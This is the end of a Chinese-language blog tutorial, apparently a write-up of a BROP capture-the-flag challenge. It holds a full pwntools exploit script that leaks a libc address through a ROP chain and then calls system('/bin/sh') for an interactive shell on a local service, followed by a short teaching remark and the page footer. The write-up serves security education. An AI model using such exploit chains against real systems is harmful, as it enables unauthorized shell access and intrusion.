+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">read_got = <span class="number">0x601028</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400793</span></span><br><span class="line">ret = pop_rdi_ret+<span class="number">1</span></span><br><span class="line">puts_plt = <span class="number">0x00400550</span></span><br><span class="line">main = <span class="number">0x00400677</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">72</span></span><br><span class="line">payload +=p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(<span class="number">0x00400677</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_libc = u64(io.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base_address = puts_libc - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_libc = libc_base_address + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_libc = libc_base_address + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts libc address is 0x%x&quot;</span> %puts_libc)</span><br><span class="line">log.info(<span class="string">&quot;libc base address is 0x%x&quot;</span> %libc_base_address)</span><br><span class="line">log.info(<span class="string">&quot;system libc address is 0x%x&quot;</span> %system_libc)</span><br><span class="line">log.info(<span class="string">&quot;/bin/sh libc address is 0x%x&quot;</span> %binsh_libc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">get_shell = <span class="string">b&quot;a&quot;</span>*<span class="number">72</span></span><br><span class="line">get_shell += p64(pop_rdi_ret)</span><br><span class="line">get_shell += p64(binsh_libc)</span><br><span class="line">get_shell += p64(ret)*<span class="number">5</span></span><br><span class="line">get_shell += p64(system_libc)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(get_shell)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>其實這幾個步驟都可以全部整合成一個 script 但為了教學方便就分段了<br><img src="/img/2022/BROP/BROP_hctf_10.png" alt=""></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/sda06407" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2022 AStar<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
